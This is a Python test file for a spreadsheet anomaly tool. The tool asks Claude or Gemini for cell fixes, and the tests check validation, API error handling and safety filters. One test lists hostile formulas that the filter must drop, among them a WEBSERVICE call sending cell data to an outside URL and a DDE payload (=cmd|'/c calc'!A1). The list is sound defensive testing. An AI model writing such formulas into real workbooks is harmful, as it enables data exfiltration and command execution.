import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from anomaly_hunter import triage
from anomaly_hunter.server import create_app

COLS = ["OrderDate", "Region", "Units"]
ROWS = [["2026-01-06", "East", 95], ["2026-01-07", "West", -5], ["2026-01-08", "East", 50]]
BODY = {"columns": COLS, "rows": ROWS, "row_index": 1, "start_row": 0, "start_col": 0,
        "reason": "Units below weird low 0", "intent": "make it the median of Units"}


def post(body):
    return create_app().test_client().post("/fix", json=body)


def test_fix_prompt_gives_claude_real_sheet_addresses():
    p = triage._fix_prompt(COLS, ROWS, 1, 0, 0, "Units below weird low 0", "make it the median")
    assert "Data range: A1:C4 (row 1 = headers)" in p
    assert "A=OrderDate, B=Region, C=Units" in p
    assert "Flagged row 3: A3='2026-01-07', B3='West', C3=-5" in p
    assert "row 2: " in p and "row 4: " in p  # neighbours, not the flagged row twice
    assert p.count("C3=-5") == 1
    assert "make it the median" in p and "Units below weird low 0" in p
    # data that starts at C5 instead of A1
    p = triage._fix_prompt(COLS, ROWS, 0, 4, 2, "", "  ")
    assert "Data range: C5:E8 (row 5 = headers)" in p and "Flagged row 6: C6=" in p
    assert "Recommend the single best fix" in p  # blank request = recommended fix


def test_fix_route_validates_before_calling_claude(monkeypatch):
    monkeypatch.setattr(triage, "api_key_configured", lambda: True)
    monkeypatch.setattr(triage, "suggest_fix", lambda *a: 1 / 0)  # must never be reached
    for bad in ({**BODY, "row_index": 3}, {**BODY, "row_index": -1}, {**BODY, "row_index": True},
                {**BODY, "start_col": "A"}, {**BODY, "intent": "x" * 2001}, {**BODY, "intent": 5},
                {**BODY, "rows": [[1]]}, [1]):
        assert post(bad).status_code == 400, bad


def test_fix_route_503_without_key(monkeypatch):
    monkeypatch.setattr(triage, "api_key_configured", lambda: False)
    r = post(BODY)
    assert r.status_code == 503 and "free Google AI key" in r.get_json()["error"]


def test_fix_route_passes_request_through(monkeypatch):
    monkeypatch.setattr(triage, "api_key_configured", lambda: True)
    seen = {}
    fake = {"explanation": "Median of Units.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2,C4)"}]}
    monkeypatch.setattr(triage, "suggest_fix", lambda *a: seen.setdefault("args", a) and fake)
    r = post({**BODY, "intent": None})
    assert r.status_code == 200 and r.get_json() == fake
    assert seen["args"] == (COLS, ROWS, 1, 0, 0, "Units below weird low 0", "", None)


def stub_api(monkeypatch, content, stop="end_turn"):
    """Local stand-in for the Claude API: the real SDK talks to it. -> (server, list of request bodies)."""
    sent = []

    class Stub(BaseHTTPRequestHandler):
        def do_POST(self):
            sent.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
            out = json.dumps({"id": "msg_1", "type": "message", "role": "assistant", "model": triage.MODEL,
                              "content": content, "stop_reason": stop, "stop_sequence": None,
                              "usage": {"input_tokens": 1, "output_tokens": 1}}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), Stub)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test")
    monkeypatch.setenv("ANTHROPIC_BASE_URL", f"http://127.0.0.1:{srv.server_port}")
    return srv, sent


def test_suggest_fix_through_real_sdk(monkeypatch):
    """Real anthropic SDK request + structured-output parse."""
    answer = {"explanation": "Use the median.", "changes": [
        {"cell": "c3", "new": "=MEDIAN(C2,C4)"}, {"cell": "$C$4", "new": "50"},
        {"cell": "Sheet1!C3", "new": "1"}, {"cell": "C0", "new": "1"}]}
    srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
    try:
        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "median please")
    finally:
        srv.shutdown()
    # lower-cased and $-anchored addresses are normalised; sheet-qualified and row 0 are dropped
    assert out == {"explanation": "Use the median.",
                   "changes": [{"cell": "C3", "new": "=MEDIAN(C2,C4)"}, {"cell": "C4", "new": "50"}]}
    assert sent[0]["model"] == triage.MODEL
    assert sent[0]["output_config"]["format"]["type"] == "json_schema"
    assert "median please" in sent[0]["messages"][0]["content"]


def test_fix_route_explains_refusal_and_cut_off_answers(monkeypatch):
    for content, stop, msg in (([], "refusal", "no usable answer"),
                               ([{"type": "text", "text": '{"explanation": "cu'}], "max_tokens", "incomplete")):
        srv, _ = stub_api(monkeypatch, content, stop)
        try:
            r = post(BODY)
        finally:
            srv.shutdown()
        assert r.status_code == 502 and msg in r.get_json()["error"], r.get_json()


def test_refers_to_itself_catches_circular_formulas():
    loops = ["=MEDIAN(C2:C41)", "=C11*2", "=$C$11+1", "=SUM(C:C)", "=SUM(B:D)", "=MEDIAN(C$2:C$40)"]
    loops += ["=SUM(C41:C2)", "=SUM(D20:B5)"]
    fine = ["=AVERAGE(Data!C2:C11)", "=MEDIAN(C2:C10,C12:C41)", "=SUM(A:B)", "=LOG10(C5)", "50", '="C11"', "=Other!C11", "=TRUE", "=ROUND(C12,0)",
            '=AVERAGEIFS(C2:C10,B2:B10,"East")']
    assert all(triage.refers_to_itself("C11", f) for f in loops)
    assert not any(triage.refers_to_itself("C11", f) for f in fine)
    assert triage.refers_to_itself("AA3", "=AVERAGE(Z1:AB9)")


def test_suggest_fix_drops_circular_formula(monkeypatch):
    answer = {"explanation": "Median.", "changes": [{"cell": "C3", "new": "=MEDIAN(C2:C4)"},
                                                   {"cell": "C2", "new": "=MEDIAN(C3,C4)"}]}
    srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
    try:
        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "")
    finally:
        srv.shutdown()
    assert out["changes"] == [{"cell": "C2", "new": "=MEDIAN(C3,C4)"}]
    assert "Left out C3" in out["explanation"]
    assert "never refer to the cell it is written into" in sent[0]["messages"][0]["content"]


def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch):
    bad = ['=WEBSERVICE("https://x/?"&A2)', '=IMAGE("https://x/a.png")', '=HYPERLINK("http://x","go")',
           "=[Other.xlsx]Sheet1!A1", "=FILTERXML(A1,\"//a\")", "=cmd|'/c calc'!A1", '+WEBSERVICE("https://x")',
           ' @HYPERLINK("http://x")']
    wide = COLS + ["D", "E"]  # a table wide and long enough to hold every proposed cell
    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 6
    answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
              + [{"cell": "E2", "new": "=AVERAGEIFS(C2:C3,B2:B3,\"East\")"}, {"cell": "E3", "new": "imaging"}]}
    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
    try:
        out = triage.suggest_fix(wide, rows, 1, 0, 0, "", "")
    finally:
        srv.shutdown()
    assert [c["cell"] for c in out["changes"]] == ["E2", "E3"]  # plain text values are never formulas
    assert "reached outside this workbook" in out["explanation"]


def test_engine_reason_wording_the_panel_reads():
    """panel/taskpane.js recommendFix parses these engine phrases - keep them in step."""
    c = create_app().test_client()
    cols = ["id", "Units"]
    rows = [[k, 10 + k % 3] for k in range(60)] + [[99, ""], [7, "12O"], [5, 12]]
    rows[5] = [5, 12]
    reasons = " | ".join(r["reason"] for r in c.post("/scan", json={"columns": cols, "rows": rows, "limits": {}}).get_json()["rows"])
    assert "Blank cell in column Units, which" in reasons
    assert 'Text "12O" in number column Units' in reasons
    assert "Duplicate of row 7" in reasons
    # the Route Monitor glues "<col> weird limit is X; this is Y" back together (panel/taskpane.js issuesOf)
    rows = [[k, 10 + k % 3] for k in range(40)] + [[99, 500]]
    res = c.post("/scan", json={"columns": cols, "rows": rows, "limits": {"Units": [9, 13, 0, 20]}}).get_json()["rows"]
    assert "Units weird limit is 20; this is 500" in res[-1]["reason"]


def test_suggest_fix_keeps_to_the_table(monkeypatch):  # a prompt-injected cell can't steer writes elsewhere on the sheet
    last = f"{chr(64 + len(COLS))}{len(ROWS) + 1}"  # bottom-right data cell
    answer = {"explanation": "x", "changes": [{"cell": "A1", "new": "Region"}, {"cell": last, "new": "7"},
                                              {"cell": "ZZ9999", "new": "1"}, {"cell": f"A{len(ROWS) + 2}", "new": "1"},
                                              {"cell": f"{chr(65 + len(COLS))}2", "new": "1"}]}
    srv, sent = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
    try:
        out = triage.suggest_fix(COLS, ROWS, 1, 0, 0, "low", "")
    finally:
        srv.shutdown()
    assert [c["cell"] for c in out["changes"]] == ["A1", last]  # header row + data rows only
    assert "outside the table" in out["explanation"] and "ZZ9999" in out["explanation"]


# ---- free AI: a Google Gemini key pasted in the pane (no credit card), same safety checks on the answer ----

def gemini_stub(monkeypatch, tmp_path, status=200, content=None, error=None):
    """Local stand-in for Google's OpenAI-compatible endpoint. -> list of (headers, body) it received."""
    got = []

    class Stub(BaseHTTPRequestHandler):
        def do_POST(self):
            got.append((dict(self.headers), json.loads(self.rfile.read(int(self.headers["Content-Length"])))))
            out = json.dumps({"error": {"message": error}} if error else {"choices": [{"message": {"content": content}}]}).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), Stub)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    monkeypatch.setattr(triage, "GEMINI_URL", f"http://127.0.0.1:{srv.server_port}/v1beta/openai/chat/completions")
    monkeypatch.setattr(triage, "KEY_FILE", tmp_path / "gemini-key.txt")
    monkeypatch.delenv("GEMINI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    return got


def test_pasted_key_turns_on_free_ai_and_can_be_removed(monkeypatch, tmp_path):
    gemini_stub(monkeypatch, tmp_path)
    c = create_app().test_client()
    assert c.get("/health").get_json()["ai_available"] is False
    assert c.post("/key", json={"key": "  AIzaTest_key-123 "}).get_json() == {"ai_available": True, "ai_provider": "gemini"}
    assert (tmp_path / "gemini-key.txt").read_text() == "AIzaTest_key-123"
    assert c.get("/health").get_json()["ai_provider"] == "gemini"
    for bad in ({"key": "<script>"}, {"key": "a b"}, {"key": 5}, {}):
        assert c.post("/key", json=bad).status_code == 400, bad
    assert c.post("/key", json={"key": ""}).get_json()["ai_available"] is False
    assert not (tmp_path / "gemini-key.txt").exists()


def test_gemini_fix_goes_through_the_same_safety_checks(monkeypatch, tmp_path):
    answer = {"explanation": "Use the median.", "changes": [{"cell": "C3", "new": "50"}, {"cell": "B3", "new": "=WEBSERVICE(\"http://x\")"},
                                                            {"cell": "Z99", "new": "1"}]}
    got = gemini_stub(monkeypatch, tmp_path, content=json.dumps(answer))
    (tmp_path / "gemini-key.txt").write_text("AIzaTest")
    r = post(BODY)
    assert r.status_code == 200, r.get_json()
    assert r.get_json()["changes"] == [{"cell": "C3", "new": "50"}]  # outside-the-workbook and off-table writes dropped
    headers, body = got[0]
    assert headers["Authorization"] == "Bearer AIzaTest" and body["model"] == triage.GEMINI_MODEL
    assert "C3=-5" in body["messages"][0]["content"]


def test_gemini_free_limit_and_bad_key_say_what_to_do(monkeypatch, tmp_path):
    for status, error, words in ((429, None, "free Google AI limit is used up"), (400, "API key not valid. Please pass a valid API key.", "paste it again"),
                                 (403, "Permission denied", "paste it again"), (400, "Invalid JSON payload", "error 400"), (500, None, "error 500")):
        gemini_stub(monkeypatch, tmp_path, status=status, content="", error=error)
        (tmp_path / "gemini-key.txt").write_text("AIzaTest")
        r = post(BODY)
        assert r.status_code == 502 and words in r.get_json()["error"], (status, r.get_json())


def test_gemini_garbled_answer_is_a_clear_error(monkeypatch, tmp_path):
    gemini_stub(monkeypatch, tmp_path, content="not json")
    (tmp_path / "gemini-key.txt").write_text("AIzaTest")
    r = post(BODY)
    assert r.status_code == 502 and "incomplete" in r.get_json()["error"]
